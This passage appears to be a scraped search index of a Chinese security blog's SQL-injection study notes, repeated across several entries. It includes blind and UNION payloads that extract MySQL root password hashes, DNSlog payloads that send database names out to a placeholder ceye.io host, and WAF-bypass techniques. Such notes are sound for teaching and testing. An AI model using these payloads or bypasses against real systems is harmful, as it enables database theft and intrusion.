table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2分类"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1注入点的不同分类"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2提交方式的不同分类"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3获取信息的方式不同分类"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3盲注原理"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select 